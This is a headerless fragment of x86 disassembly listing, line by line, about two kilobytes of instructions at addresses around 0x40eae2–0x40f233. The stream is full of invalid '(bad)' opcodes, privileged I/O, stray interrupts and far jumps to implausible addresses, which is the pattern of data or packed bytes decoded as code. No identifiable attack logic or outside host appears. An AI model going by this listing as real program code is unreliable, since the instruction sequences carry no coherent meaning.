  40eae2:	pop    ecx
  40eae3:	call   0x6942f5af
  40eae8:	mov    ah,0xff
  40eaea:	xor    dh,bl
  40eaec:	dec    esp
  40eaed:	ret    
  40eaee:	test   DWORD PTR [edx],edi
  40eaf0:	aaa    
  40eaf1:	test   esi,eax
  40eaf3:	push   ds
  40eaf4:	in     al,0xd4
  40eaf6:	xor    ecx,0x3b
  40eaf9:	add    DWORD PTR ds:[edi-0x73],edx
  40eafd:	dec    ebp
  40eafe:	iret   
  40eaff:	and    al,0x8b
  40eb01:	repz inc esp
  40eb03:	ret    
  40eb04:	mov    esp,0xf6f4b866
  40eb09:	loope  0x40eb42
  40eb0b:	push   ebx
  40eb0c:	enter  0x262a,0x85
  40eb10:	jo     0x40eadb
  40eb12:	inc    ebx
  40eb13:	mov    edx,0xacc7cb93
  40eb18:	jge    0x40eb4a
  40eb1a:	sub    esp,DWORD PTR [ecx+esi*1]
  40eb1d:	xor    ah,cl
  40eb1f:	in     eax,dx
  40eb20:	jp     0x40eb34
  40eb22:	add    DWORD PTR [ebx-0x7df7f00d],ebp
  40eb28:	jb     0x40eaae
  40eb2a:	push   cs
  40eb2b:	in     eax,0x5a
  40eb2d:	and    BYTE PTR [ebx+0x7c],dl
  40eb30:	push   ecx
  40eb31:	mov    ds:0x42cde3f8,eax
  40eb36:	inc    eax
  40eb37:	xor    eax,0xfea54992
  40eb3c:	mov    cl,0x15
  40eb3e:	call   0x56e3e07
  40eb43:	add    dl,BYTE PTR [esi-0x2d7d62e9]
  40eb49:	shl    BYTE PTR ss:[edx-0x3e],1
  40eb4d:	stos   DWORD PTR es:[edi],eax
  40eb4e:	jbe    0x40eba2
  40eb50:	mov    cl,0x5a
  40eb52:	iret   
  40eb53:	int    0xbf
  40eb55:	jmp    0x976bb847
  40eb5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb5b:	adc    al,0xf5
  40eb5d:	in     al,dx
  40eb5e:	int3   
  40eb5f:	nop
  40eb60:	fild   DWORD PTR [ebp-0x50]
  40eb63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb64:	aas    
  40eb65:	call   0x3283:0xf4beb61a
  40eb6c:	lds    edx,FWORD PTR [esi]
  40eb6e:	xlat   BYTE PTR ds:[ebx]
  40eb6f:	outs   dx,DWORD PTR ds:[esi]
  40eb70:	(bad)  
  40eb72:	gs cmc 
  40eb74:	test   al,0x63
  40eb76:	mov    fs,WORD PTR [ebp+0x3b9eb405]
  40eb7c:	inc    ecx
  40eb7d:	popa   
  40eb7e:	mov    cl,0x3b
  40eb80:	add    eax,esp
  40eb82:	dec    esi
  40eb83:	lods   eax,DWORD PTR ds:[esi]
  40eb84:	retf   
  40eb85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb86:	sub    al,0x7c
  40eb88:	pop    esp
  40eb89:	jmp    0x40ebd0
  40eb8b:	xchg   ebp,eax
  40eb8c:	or     DWORD PTR [edi-0x73],ecx
  40eb8f:	in     al,0xad
  40eb91:	das    
  40eb92:	adc    dh,bl
  40eb94:	xchg   edx,eax
  40eb95:	jle    0x40eb29
  40eb97:	add    eax,0x4d1ad4a6
  40eb9c:	pushf  
  40eb9d:	mov    esi,0x7efad7c3
  40eba2:	fdiv   QWORD PTR [ebx+edi*8+0x4a]
  40eba6:	(bad)  
  40eba7:	jp     0x40eb4f
  40eba9:	jns    0x40ebb1
  40ebab:	imul   edx,ebx,0xc1e916cd
  40ebb1:	xor    DWORD PTR [edi+0x62526d9c],edi
  40ebb7:	int3   
  40ebb8:	mov    ecx,0x5f803b0d
  40ebbd:	xchg   ebp,eax
  40ebbe:	sti    
  40ebbf:	call   0xf5eaf8c7
  40ebc4:	mov    BYTE PTR [eax],0x38
  40ebc7:	aam    0x47
  40ebc9:	xlat   BYTE PTR ds:[ebx]
  40ebca:	in     al,dx
  40ebcb:	(bad)  
  40ebcc:	fild   QWORD PTR [edi+0x44]
  40ebcf:	pushf  
  40ebd0:	das    
  40ebd1:	jmp    0x40ebeb
  40ebd3:	push   esp
  40ebd4:	das    
  40ebd5:	cmp    BYTE PTR [edi-0x6766fe04],ch
  40ebdb:	retf   
  40ebdc:	js     0x40eb8c
  40ebde:	and    eax,0x9709b5dd
  40ebe3:	or     al,0x7a
  40ebe5:	pushf  
  40ebe6:	pop    edi
  40ebe7:	(bad)  
  40ebe8:	imul   ecx,DWORD PTR [esi],0x35f9efcd
  40ebee:	fdivp  st(0),st
  40ebf0:	mov    ah,0xf8
  40ebf2:	jo     0x40ebbe
  40ebf4:	lods   al,BYTE PTR ds:[si]
  40ebf6:	hlt    
  40ebf7:	mov    ah,0x1b
  40ebf9:	add    eax,0x5ccfda10
  40ebfe:	sub    DWORD PTR [edx],esp
  40ec00:	frstor [eax-0x19]
  40ec03:	fcmovu st,st(5)
  40ec05:	pop    ds
  40ec06:	stos   BYTE PTR es:[edi],al
  40ec07:	adc    ebx,DWORD PTR [ecx]
  40ec09:	sahf   
  40ec0a:	jle    0x40ebe0
  40ec0c:	cmp    ecx,DWORD PTR [eax]
  40ec0e:	mov    edx,0xdbe98a51
  40ec13:	dec    edx
  40ec14:	jg     0x40ec1d
  40ec16:	psrld  mm2,QWORD PTR [esi+0x7a]
  40ec1a:	das    
  40ec1b:	mov    dh,0xa3
  40ec1d:	add    al,0x86
  40ec1f:	add    DWORD PTR [esp+edi*2-0x24],eax
  40ec23:	xlat   BYTE PTR ds:[ebx]
  40ec24:	xchg   BYTE PTR [edx-0xbbe84f1],al
  40ec2a:	and    BYTE PTR [ecx+ecx*4-0x5a8674b6],0x9e
  40ec32:	(bad)  
  40ec33:	lock xchg esp,eax
  40ec35:	pop    edi
  40ec36:	dec    ecx
  40ec37:	mov    esi,0x8ed1d865
  40ec3c:	push   cs
  40ec3d:	push   ebx
  40ec3e:	jmp    0x40ebfa
  40ec40:	inc    edx
  40ec41:	mov    ebp,0x17180a2c
  40ec46:	cs je  0x40ec1a
  40ec49:	div    ebx
  40ec4b:	mov    BYTE PTR [eax-0x64],bh
  40ec4e:	(bad)  
  40ec4f:	jmp    0x5f3a:0xe591e8ea
  40ec56:	in     al,dx
  40ec57:	out    dx,eax
  40ec58:	xchg   edi,eax
  40ec59:	sub    eax,0xdee4012a
  40ec5e:	lock mov cl,0xcb
  40ec61:	test   al,0x5a
  40ec63:	xor    bh,BYTE PTR [ecx-0x21]
  40ec66:	cwde   
  40ec67:	add    DWORD PTR [ebx],esp
  40ec69:	je     0x40ec1c
  40ec6b:	fidivr DWORD PTR [esi-0x2424230f]
  40ec71:	or     eax,0x8dac364b
  40ec76:	and    BYTE PTR [ecx+0x76ac2a5a],dh
  40ec7c:	xor    ebp,DWORD PTR [esi+0x70]
  40ec7f:	dec    eax
  40ec80:	pop    es
  40ec81:	(bad)
  40ec84:	xchg   ebp,eax
  40ec85:	adc    DWORD PTR [ebx],esp
  40ec87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec88:	stc    
  40ec89:	jno    0x40ec79
  40ec8b:	(bad)
  40ec8f:	mov    ecx,0xdbd7795
  40ec94:	fadd   st(7),st
  40ec96:	xchg   esp,eax
  40ec97:	inc    ebx
  40ec98:	jp     0x40ec2c
  40ec9a:	shr    bh,1
  40ec9c:	pop    edx
  40ec9d:	mov    ds,WORD PTR [edi-0x60d20b36]
  40eca3:	ret    
  40eca4:	shl    DWORD PTR [edi+0x6f3d26ac],0x2d
  40ecab:	aad    0x3
  40ecad:	jb     0x40ecab
  40ecaf:	in     al,0xd7
  40ecb1:	(bad)  
  40ecb3:	cwde   
  40ecb4:	push   esp
  40ecb5:	cld    
  40ecb6:	pop    eax
  40ecb7:	and    al,0xdc
  40ecb9:	xor    DWORD PTR [edi],0xfffffff5
  40ecbc:	mov    al,ds:0x3e1f12f4
  40ecc1:	stos   BYTE PTR es:[edi],al
  40ecc2:	jp     0x40ece0
  40ecc4:	stos   DWORD PTR es:[edi],eax
  40ecc5:	push   cs
  40ecc6:	sub    dh,BYTE PTR [esi+0x44]
  40ecc9:	ret    0xa33d
  40eccc:	dec    esp
  40eccd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecce:	ins    BYTE PTR es:[edi],dx
  40eccf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecd0:	daa    
  40ecd1:	in     eax,0x8c
  40ecd3:	sahf   
  40ecd4:	hlt    
  40ecd5:	xchg   esp,eax
  40ecd6:	inc    ebx
  40ecd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecd8:	push   es
  40ecd9:	jno    0x40ece3
  40ecdb:	int    0x95
  40ecdd:	sti    
  40ecde:	or     DWORD PTR ds:0xa7b46fba,edx
  40ece4:	aam    0xe7
  40ece6:	push   es
  40ece7:	push   ebp
  40ece8:	hlt    
  40ece9:	test   al,0x14
  40eceb:	jp     0x40ed59
  40eced:	retf   
  40ecee:	mov    edi,0xa8a04dc
  40ecf3:	jbe    0x40ecec
  40ecf5:	mov    esi,DWORD PTR [ebx]
  40ecf7:	in     al,dx
  40ecf8:	iret   
  40ecf9:	pop    es
  40ecfa:	xchg   edi,eax
  40ecfb:	sahf   
  40ecfc:	pop    esi
  40ecfd:	ror    DWORD PTR [ecx-0xcd64127],cl
  40ed03:	aam    0xd1
  40ed05:	jmp    0x7bc56eda
  40ed0a:	dec    edx
  40ed0b:	mov    cl,0xd7
  40ed0d:	push   ecx
  40ed0e:	mov    WORD PTR [ebp+eiz*2-0x6c61fb4],?
  40ed15:	test   eax,0xef24c682
  40ed1b:	xchg   DWORD PTR [ecx-0x5a],ecx
  40ed1e:	sbb    esi,DWORD PTR [ebp+0x5d5fed30]
  40ed24:	adc    bh,BYTE PTR [edi]
  40ed26:	mov    bh,0xcb
  40ed28:	retf   
  40ed29:	inc    ebx
  40ed2a:	mov    DWORD PTR [ebp-0x7a86e9d2],edi
  40ed30:	fwait
  40ed31:	int    0xae
  40ed33:	fisubr DWORD PTR [ebx]
  40ed35:	mov    bh,0x75
  40ed37:	adc    DWORD PTR ss:[edx-0x2d87c175],edi
  40ed3e:	(bad)  
  40ed3f:	sbb    ebp,edx
  40ed41:	mov    dl,0xd3
  40ed43:	push   edx
  40ed44:	sbb    al,0xa4
  40ed46:	outs   dx,BYTE PTR ds:[esi]
  40ed47:	test   BYTE PTR [ecx-0x70],dh
  40ed4a:	sub    esp,DWORD PTR [ebp+0x5f]
  40ed4d:	sbb    BYTE PTR [esi],0xc1
  40ed50:	mov    ebp,DWORD PTR [esp+eax*8-0x62]
  40ed54:	sub    BYTE PTR [esi],bh
  40ed56:	jb     0x40ed4b
  40ed58:	mov    ds:0xba2355cf,eax
  40ed5d:	test   al,0xf9
  40ed5f:	out    0xc1,al
  40ed61:	sbb    DWORD PTR [edi],edx
  40ed63:	enter  0x8df2,0xab
  40ed67:	out    dx,al
  40ed68:	inc    ecx
  40ed69:	(bad)  
  40ed6a:	cld    
  40ed6b:	enter  0xa968,0x7a
  40ed6f:	jg     0x40ed66
  40ed71:	sahf   
  40ed72:	daa    
  40ed73:	ja     0x40ed03
  40ed75:	call   0x9e90:0xffcad1d4
  40ed7c:	je     0x40edc4
  40ed7e:	xor    BYTE PTR [edx+esi*8+0x290b54f],bl
  40ed85:	data16 (bad) [ebp-0x352c874e]
  40ed8c:	nop
  40ed8d:	scas   eax,DWORD PTR es:[edi]
  40ed8e:	add    al,0xd0
  40ed90:	sub    eax,0xd087bfde
  40ed95:	jp     0x40edce
  40ed97:	xor    DWORD PTR [eax-0x1648e082],ecx
  40ed9d:	scas   al,BYTE PTR es:[edi]
  40ed9e:	cmp    BYTE PTR [ecx],ah
  40eda0:	test   DWORD PTR [edi],esp
  40eda2:	jmp    0x40edc2
  40eda4:	sahf   
  40eda5:	jmp    0xeff5d3d9
  40edaa:	inc    esi
  40edab:	mov    edx,0xea81178c
  40edb0:	ds (bad) 
  40edb2:	xor    esi,edi
  40edb4:	lods   al,BYTE PTR ds:[esi]
  40edb5:	test   BYTE PTR ds:0x143f2e81,ah
  40edbb:	aam    0x69
  40edbd:	retf   0xae9
  40edc0:	std    
  40edc1:	and    eax,0x6f5853fb
  40edc6:	iret   
  40edc7:	mov    dh,0x92
  40edc9:	ss jecxz 0x40ede9
  40edcc:	mov    ds:0xd3e4c4cf,eax
  40edd1:	adc    ch,BYTE PTR [edi-0x78dc1262]
  40edd7:	icebp  
  40edd8:	inc    edi
  40edd9:	fild   QWORD PTR [esi+0x3b4e308a]
  40eddf:	add    al,0xf4
  40ede1:	jle    0x40ed7f
  40ede3:	cmp    al,0xb5
  40ede5:	retf   0xbf86
  40ede8:	int    0x58
  40edea:	pushf  
  40edeb:	scas   eax,DWORD PTR es:[edi]
  40edec:	add    edi,DWORD PTR [esi+esi*8-0x7c547299]
  40edf3:	mov    bl,0xe8
  40edf5:	cli    
  40edf6:	sub    dl,bh
  40edf8:	popa   
  40edf9:	cmp    eax,DWORD PTR [edi-0x50556b66]
  40edff:	xor    eax,0x9cb5e6be
  40ee04:	leave  
  40ee05:	cmc    
  40ee06:	in     al,0x80
  40ee08:	lds    edx,FWORD PTR [ebx-0x4]
  40ee0b:	add    al,0x9b
  40ee0d:	jmp    0x40edc7
  40ee0f:	or     DWORD PTR [edi+0x48],eax
  40ee12:	pop    eax
  40ee13:	or     BYTE PTR [eax],ch
  40ee15:	retf   
  40ee16:	push   ds
  40ee17:	loopne 0x40ee06
  40ee19:	sbb    edx,edx
  40ee1b:	mov    eax,ds:0x47474d20
  40ee20:	xchg   edx,eax
  40ee21:	or     DWORD PTR [eax-0x53],0x32
  40ee25:	or     cl,BYTE PTR [edx+0x5d115f34]
  40ee2b:	cmp    BYTE PTR [eax],0xa4
  40ee2e:	add    edx,DWORD PTR [esi+edx*2+0x3a]
  40ee32:	dec    ebp
  40ee33:	test   eax,0xf04fc717
  40ee38:	aad    0x3e
  40ee3a:	pop    ss
  40ee3b:	imul   esi,DWORD PTR [edi+0x48],0xe4abb08c
  40ee42:	rcl    BYTE PTR [ebp+0x6e],1
  40ee45:	inc    ebp
  40ee46:	iret   
  40ee47:	push   cs
  40ee48:	mov    cl,0xa3
  40ee4a:	xchg   edx,eax
  40ee4b:	sub    bh,dh
  40ee4d:	jp     0x40ee39
  40ee4f:	mov    DWORD PTR [ecx-0x2c],ebp
  40ee52:	pop    edi
  40ee53:	ror    DWORD PTR [ecx],1
  40ee55:	push   es
  40ee56:	retf   0x376a
  40ee59:	dec    edx
  40ee5a:	dec    edi
  40ee5b:	imul   ecx,DWORD PTR [ebx+0x33],0xffffff9d
  40ee5f:	mov    edi,DWORD PTR [edi+edi*4+0x37499699]
  40ee66:	pop    esp
  40ee67:	in     eax,0xc6
  40ee69:	inc    ebx
  40ee6a:	push   edi
  40ee6b:	inc    ebp
  40ee6c:	dec    ebp
  40ee6d:	jo     0x40ee48
  40ee6f:	pop    ebp
  40ee70:	rol    DWORD PTR [edx-0x7bf9fb24],1
  40ee76:	mov    esp,0x15bce30d
  40ee7b:	fwait
  40ee7c:	test   DWORD PTR [esi-0x2c],ecx
  40ee7f:	jl     0x40ee7f
  40ee81:	mov    cl,0x1f
  40ee83:	or     dl,al
  40ee85:	inc    esi
  40ee86:	mov    ecx,0x8aea43b1
  40ee8b:	and    al,0x52
  40ee8d:	push   edx
  40ee8e:	shl    DWORD PTR [ecx],1
  40ee90:	fisubr WORD PTR [eax+0x1fd5ee4d]
  40ee96:	push   edx
  40ee97:	inc    ecx
  40ee98:	sub    BYTE PTR [esi-0x6722a331],bl
  40ee9e:	mov    BYTE PTR [ecx+0x71757060],ah
  40eea4:	dec    si
  40eea6:	push   esi
  40eea7:	test   DWORD PTR [ebx-0x6389a78f],edx
  40eead:	repnz pop esi
  40eeaf:	daa    
  40eeb0:	mov    BYTE PTR [edi],ch
  40eeb2:	pusha  
  40eeb3:	shl    BYTE PTR [edx+0x10],0xf7
  40eeb7:	lahf   
  40eeb8:	sbb    eax,0x7e3a2591
  40eebd:	xor    BYTE PTR [eax+esi*4+0x6e69d0db],ch
  40eec4:	nop
  40eec5:	or     ecx,edi
  40eec7:	or     DWORD PTR [esi+0x9],ebx
  40eeca:	cmp    esp,DWORD PTR [eax-0x61]
  40eecd:	clc    
  40eece:	in     eax,0xb4
  40eed0:	out    0x75,al
  40eed2:	pop    ecx
  40eed3:	daa    
  40eed4:	sbb    al,BYTE PTR [esi+0x21da1cd4]
  40eeda:	pop    edi
  40eedb:	call   0x9e82:0x89cb81c2
  40eee2:	leave  
  40eee3:	push   eax
  40eee4:	add    ebx,DWORD PTR [ecx-0xe078be4]
  40eeea:	lock push ss
  40eeec:	and    cl,BYTE PTR ds:0x2b4ead37
  40eef2:	loope  0x40ef34
  40eef4:	sbb    al,0x86
  40eef6:	(bad)  
  40eef7:	mov    ebp,0x6ae93197
  40eefc:	dec    ebp
  40eefd:	add    DWORD PTR es:[ecx],0x6e
  40ef01:	mov    cl,0xa9
  40ef03:	jmp    0xeb679349
  40ef08:	pop    esp
  40ef09:	add    eax,0xa993cc6
  40ef0e:	jmp    0x40eea2
  40ef10:	es push esp
  40ef12:	inc    esp
  40ef13:	outs   dx,DWORD PTR ds:[esi]
  40ef14:	es adc al,0x46
  40ef17:	rol    ebp,0xb6
  40ef1a:	push   esp
  40ef1b:	(bad)  
  40ef1c:	pushf  
  40ef1d:	fsubr  DWORD PTR [ecx*8-0xefe0aa6]
  40ef24:	jge    0x40ef1c
  40ef26:	dec    esi
  40ef27:	mov    ecx,0x4c61a9bf
  40ef2c:	add    edx,eax
  40ef2e:	fnstcw WORD PTR [ebx-0xc41bce6]
  40ef34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef35:	rol    BYTE PTR [ebx],0xba
  40ef38:	shr    BYTE PTR [esi],cl
  40ef3a:	pop    esp
  40ef3b:	dec    esp
  40ef3c:	inc    edi
  40ef3d:	enter  0x3a38,0xfd
  40ef41:	mov    esp,0xae5c45b2
  40ef46:	jo     0x40ef08
  40ef48:	ds sub eax,0x66a99ba1
  40ef4e:	xor    eax,0x50d2b1cb
  40ef53:	clc    
  40ef54:	pop    ebp
  40ef55:	push   esp
  40ef56:	dec    ebx
  40ef57:	or     DWORD PTR [edx+0x5c],ebx
  40ef5a:	add    DWORD PTR [edi-0x70],0x59
  40ef5e:	xor    al,0x1d
  40ef60:	sub    BYTE PTR [edx-0x4c],ch
  40ef63:	jge    0x40efc4
  40ef65:	push   ebx
  40ef66:	test   al,0x3e
  40ef68:	jle    0x40ef10
  40ef6a:	mov    eax,0x4654f537
  40ef6f:	mov    dh,0x96
  40ef71:	cwde   
  40ef72:	lods   al,BYTE PTR ds:[esi]
  40ef73:	cmp    BYTE PTR [eiz*4+0x31a1184b],dl
  40ef7a:	je     0x40efb5
  40ef7c:	jmp    0x5a7cc688
  40ef81:	and    al,0xeb
  40ef83:	bound  esi,QWORD PTR [edi+0x26527322]
  40ef89:	js     0x40ef8e
  40ef8b:	pop    ecx
  40ef8c:	js     0x40f003
  40ef8e:	xor    dh,BYTE PTR [eax-0x61eb026]
  40ef94:	in     eax,0xed
  40ef96:	aam    0x23
  40ef98:	pop    ecx
  40ef99:	int3   
  40ef9a:	shr    DWORD PTR [edi+edx*2-0x42],cl
  40ef9e:	cdq    
  40ef9f:	add    eax,0xb0a2c6a7
  40efa4:	call   FWORD PTR [eax-0x624f1ba4]
  40efaa:	adc    eax,0x2467b7fe
  40efaf:	xor    DWORD PTR [ecx],ecx
  40efb1:	lahf   
  40efb2:	ja     0x40efa0
  40efb4:	add    ecx,edx
  40efb6:	out    dx,eax
  40efb7:	or     al,0x7
  40efb9:	jo     0x40ef52
  40efbb:	sbb    ebp,esp
  40efbd:	and    eax,0x3130fd28
  40efc2:	das    
  40efc3:	pop    es
  40efc4:	ins    BYTE PTR es:[edi],dx
  40efc5:	lock inc edi
  40efc7:	in     eax,dx
  40efc8:	jp     0x40f001
  40efca:	hlt    
  40efcb:	mov    esp,0xfea9a6da
  40efd0:	push   ecx
  40efd1:	push   esi
  40efd2:	inc    edx
  40efd3:	loopne 0x40eff0
  40efd5:	(bad)  
  40efd6:	in     eax,0xa9
  40efd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efd9:	gs pop ebx
  40efdb:	icebp  
  40efdc:	stos   DWORD PTR es:[edi],eax
  40efdd:	fst    st(1)
  40efdf:	neg    DWORD PTR [ecx+0x3c0d7102]
  40efe5:	sub    dh,dh
  40efe7:	retf   0x2631
  40efea:	fild   WORD PTR [eax]
  40efec:	fisub  DWORD PTR [ebx+0x1d747158]
  40eff2:	jecxz  0x40efa0
  40eff4:	fist   DWORD PTR ds:0x23384b69
  40effa:	inc    edi
  40effb:	aaa    
  40effc:	loope  0x40f03d
  40effe:	mov    ebp,0x59121a
  40f003:	test   DWORD PTR [ebx],esi
  40f005:	jns    0x40eff2
  40f007:	aas    
  40f008:	sar    DWORD PTR [ebp-0x3d2ebb2f],1
  40f00e:	(bad)
  40f012:	dec    esp
  40f013:	or     dh,BYTE PTR [edx-0x58bca9c5]
  40f019:	fimul  WORD PTR [ebx-0x20]
  40f01c:	lods   eax,DWORD PTR ds:[esi]
  40f01d:	jle    0x40f04d
  40f01f:	fidiv  WORD PTR [esi+0x51]
  40f022:	rol    dh,1
  40f024:	repz mov al,0xf
  40f028:	push   ds
  40f029:	adc    BYTE PTR [esi],dl
  40f02b:	or     eax,DWORD PTR cs:[ecx+0x21a551c1]
  40f032:	dec    edx
  40f033:	js     0x40eff8
  40f035:	jmp    0x40f072
  40f037:	cmp    esp,esi
  40f039:	ret    
  40f03a:	scas   eax,DWORD PTR es:[edi]
  40f03b:	push   eax
  40f03c:	stos   BYTE PTR es:[edi],al
  40f03d:	aas    
  40f03e:	jo     0x40f033
  40f040:	add    eax,0x4a45fd52
  40f045:	push   ebp
  40f046:	jb     0x40f0be
  40f048:	pop    es
  40f049:	pop    edi
  40f04a:	xchg   edx,ebp
  40f04c:	daa    
  40f04d:	sub    al,0x6f
  40f04f:	nop
  40f050:	fadd   DWORD PTR [ecx]
  40f052:	jae    0x40f09a
  40f054:	sbb    eax,0xe3619429
  40f059:	mov    esi,ebp
  40f05b:	lea    ecx,[ebx+0x405b9fe0]
  40f061:	ret    0xdfac
  40f064:	jo     0x40f049
  40f066:	inc    ecx
  40f067:	cld    
  40f068:	out    0xd7,al
  40f06a:	pop    esp
  40f06b:	(bad)  [esi]
  40f06d:	and    eax,0x394a5ca9
  40f072:	dec    edi
  40f073:	aas    
  40f074:	inc    esp
  40f075:	ret    
  40f076:	bnd jge 0x40f073
  40f079:	and    eax,DWORD PTR [ecx]
  40f07b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f07c:	add    BYTE PTR [esi-0x2c],al
  40f07f:	add    DWORD PTR [eax+0xf],eax
  40f082:	sti    
  40f083:	mov    al,0x47
  40f085:	xchg   esi,eax
  40f086:	call   0xee0ba800
  40f08b:	dec    BYTE PTR [ecx-0xb05a64f]
  40f091:	(bad)  
  40f093:	loope  0x40f0ce
  40f095:	mov    al,ds:0x5a837e3c
  40f09a:	mov    ds:0xc0a5adce,eax
  40f09f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0a0:	ror    BYTE PTR [ebx-0x65b41642],0xd3
  40f0a7:	and    bl,BYTE PTR [eax]
  40f0a9:	repz sub BYTE PTR [edx-0x7732ae2],al
  40f0b0:	or     DWORD PTR [edi-0xa],edi
  40f0b3:	cmp    DWORD PTR [esi+edx*4],ebx
  40f0b6:	or     ch,0x49
  40f0b9:	and    ebp,eax
  40f0bb:	sbb    bl,BYTE PTR [ecx-0x400093ca]
  40f0c1:	xor    bl,ah
  40f0c3:	lds    esi,FWORD PTR [ecx-0x6fe758d]
  40f0c9:	dec    edx
  40f0ca:	ins    DWORD PTR es:[edi],dx
  40f0cb:	mov    bh,0x4d
  40f0cd:	out    dx,al
  40f0ce:	out    0x31,eax
  40f0d0:	xor    eax,0xbfe09a44
  40f0d5:	das    
  40f0d6:	mov    DWORD PTR [esi-0x10],eax
  40f0d9:	test   BYTE PTR [ebx+0x4b8a0df2],dl
  40f0df:	xlat   BYTE PTR ds:[ebx]
  40f0e0:	dec    ebx
  40f0e1:	test   al,0x78
  40f0e3:	pop    edi
  40f0e4:	nop
  40f0e5:	sbb    ch,BYTE PTR [ecx+0x3e]
  40f0e8:	sub    al,0x21
  40f0ea:	fistp  QWORD PTR [edx+0x6f]
  40f0ed:	dec    ebx
  40f0ee:	mov    eax,0x810c0032
  40f0f3:	pop    ecx
  40f0f4:	add    eax,0x473ee33c
  40f0f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0fa:	lock inc ecx
  40f0fc:	ror    BYTE PTR [ebx-0x6b],1
  40f0ff:	outs   dx,BYTE PTR ds:[esi]
  40f100:	ins    DWORD PTR es:[edi],dx
  40f101:	add    BYTE PTR [edx],bl
  40f103:	dec    esp
  40f104:	outs   dx,DWORD PTR ds:[esi]
  40f105:	ins    DWORD PTR es:[edi],dx
  40f106:	mov    dl,0x74
  40f108:	nop
  40f109:	ret    
  40f10a:	or     al,0x5f
  40f10c:	sbb    eax,0xae4ba5
  40f111:	xchg   edx,eax
  40f113:	sar    ecx,0x97
  40f116:	call   DWORD PTR [edi+0x59c3c709]
  40f11c:	mov    ds:0x637235e9,al
  40f121:	pop    edi
  40f122:	adc    BYTE PTR [ecx+0x1e],0x12
  40f126:	(bad)
  40f129:	mov    edi,0x4a9386d5
  40f12e:	jle    0x40f0ef
  40f130:	jne    0x40f161
  40f132:	fimul  WORD PTR [ecx+esi*2-0x545db37]
  40f139:	(bad)  
  40f13a:	mov    eax,ds:0x4dc432b4
  40f13f:	aam    0x90
  40f141:	loope  0x40f0c8
  40f143:	push   ecx
  40f144:	xor    eax,0xfb347af4
  40f149:	mov    ch,0x51
  40f14b:	sub    eax,0x7ab9cb0d
  40f150:	bound  ecx,QWORD PTR [ebp+0x66]
  40f153:	and    eax,0x3a6dc2aa
  40f158:	das    
  40f159:	xor    BYTE PTR [edx-0x5eebaf72],ch
  40f15f:	(bad)  
  40f161:	popfw  
  40f163:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f164:	xor    BYTE PTR [eax-0x123cf6a4],bl
  40f16a:	aaa    
  40f16b:	or     al,0x90
  40f16d:	cmc    
  40f16e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f16f:	aaa    
  40f170:	stc    
  40f171:	ins    BYTE PTR es:[edi],dx
  40f172:	push   esi
  40f173:	std    
  40f174:	mov    eax,ds:0xe8e0c4ff
  40f179:	or     BYTE PTR [edx+eiz*8+0x561eb3b9],0xce
  40f181:	sahf   
  40f182:	scas   eax,DWORD PTR es:[edi]
  40f183:	jl     0x40f1d3
  40f185:	fbld   TBYTE PTR [edx-0x21e8f9bd]
  40f18b:	jge    0x40f1e5
  40f18d:	test   BYTE PTR [ebx+0x7d],dl
  40f190:	int    0x86
  40f192:	dec    esi
  40f193:	add    esp,edx
  40f195:	(bad)  
  40f196:	sar    BYTE PTR ds:0x35748cf,cl
  40f19c:	fnsetpm(287 only) 
  40f19e:	inc    ebx
  40f19f:	pushf  
  40f1a0:	packuswb mm6,QWORD PTR [eax-0x7d]
  40f1a4:	and    BYTE PTR [edx-0x54],cl
  40f1a7:	jmp    DWORD PTR ds:0xd0df98dd
  40f1ad:	out    dx,eax
  40f1ae:	push   0xffffffc2
  40f1b0:	(bad)  
  40f1b2:	daa    
  40f1b3:	ins    BYTE PTR es:[edi],dx
  40f1b4:	xor    BYTE PTR [edi],0x3
  40f1b7:	jl     0x40f149
  40f1b9:	bound  esi,QWORD PTR [eax-0x11]
  40f1bc:	xor    al,0x14
  40f1be:	sub    al,bh
  40f1c0:	repz mov ds:0xea327317,eax
  40f1c6:	push   es
  40f1c7:	cmc    
  40f1c8:	int    0x7b
  40f1ca:	icebp  
  40f1cb:	adc    BYTE PTR [esi-0x4c],al
  40f1ce:	ds pop ebx
  40f1d0:	sbb    edi,eax
  40f1d2:	clc    
  40f1d3:	arpl   bx,cx
  40f1d5:	mov    eax,0xaaa0d97a
  40f1da:	mov    eax,0x3c0f35aa
  40f1df:	pusha  
  40f1e0:	inc    ecx
  40f1e1:	call   0xc47c3c39
  40f1e6:	scas   al,BYTE PTR es:[edi]
  40f1e7:	leave  
  40f1e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1e9:	arpl   WORD PTR ds:0x69cd6d73,cx
  40f1ef:	mov    cl,0x95
  40f1f1:	dec    edx
  40f1f2:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1f4:	(bad)  
  40f1f5:	out    0xc9,eax
  40f1f7:	lods   al,BYTE PTR ds:[esi]
  40f1f8:	or     DWORD PTR [ebx-0xf],edx
  40f1fb:	push   0xaca5b849
  40f200:	mov    esp,DWORD PTR [eax+edi*2-0x7b]
  40f204:	call   0x3cb3:0xc8ad70e9
  40f20b:	nop
  40f20c:	lahf   
  40f20d:	stc    
  40f20e:	jb     0x40f240
  40f210:	scas   eax,DWORD PTR es:[edi]
  40f211:	dec    eax
  40f212:	loopne 0x40f1fa
  40f214:	pop    edx
  40f215:	jg     0x40f1fd
  40f217:	jne    0x40f1db
  40f219:	jl     0x40f1cc
  40f21b:	mov    ah,0x62
  40f21d:	add    al,0x7
  40f21f:	add    bh,bl
  40f221:	sub    BYTE PTR [ecx],ah
  40f223:	add    eax,0x5a7191ce
  40f228:	cs data16 stc 
  40f22b:	xor    eax,0x7792c68d
  40f230:	lea    ebx,[ebx+ecx*4]
  40f233:	js     0x40f2b1
